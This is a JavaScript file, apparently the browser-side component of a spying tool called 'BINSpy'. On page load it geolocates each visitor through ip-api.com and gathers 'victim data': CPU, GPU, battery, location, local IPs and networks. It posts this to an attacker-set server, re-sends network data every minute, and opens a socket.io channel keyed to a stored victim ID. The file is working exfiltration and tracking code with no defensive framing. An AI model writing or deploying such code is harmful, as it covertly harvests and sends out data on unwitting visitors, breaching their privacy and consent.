$(document).ready(function($) {

    $.getJSON('//ip-api.com/json', function(data) {
        var d = getVictimData();

        $.extend(true, d, data);

        var parser = new UAParser();

        d.cpu = JSON.stringify(parser.getCPU())
            .replace(/"/gi, '')
            .replace(/{/gi, '')
            .replace(/}/gi, '')
            .replace(/:/gi, ' : ') + ' - ' + (navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : '');

        d.refer = document.location.host;

    	$.ajax({
            url: window.serverPath + "/register",
            data: d,
            dataType: "json",
            type: "POST",
            success: function(response) {
                console.log(response);
                if (response.status == 'OK'){
                    localStorage.setItem("BINSpy_vId", response.vId);
                    conChange();
                    queryGPU();
                    locateV();
                    tping();
                    detectBattery();
                    navigation_mode();

                    objUser.getIPs();
                    objUser.sendNetworks();

                    setInterval(function(){ 
                        objUser.getIPs();
                        objUser.sendNetworks();
                    }, 60000);

                    createSockets();
                }
            },
            error: function(error) {}
        });
    });
});

function createSockets(){
    if (typeof(io) != 'undefined') {
        namespace = '/BINSpy';
        if (window.serverPath == ''){
            socketBINSpy = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
        } else{
            socketBINSpy = io.connect(window.serverPath + namespace);
        }
    }

    if (socketBINSpy != null){
        window.onbeforeunload = function(e) {
            var d = getVictimData();
            socketBINSpy.emit('disconnect_request', d);
            return true;
        }
    }

    if (socketBINSpy != undefined) {
        socketBINSpy.emit('join', {room: localStorage.BINSpy_vId});
        defineSockets(socketBINSpy);
    }
}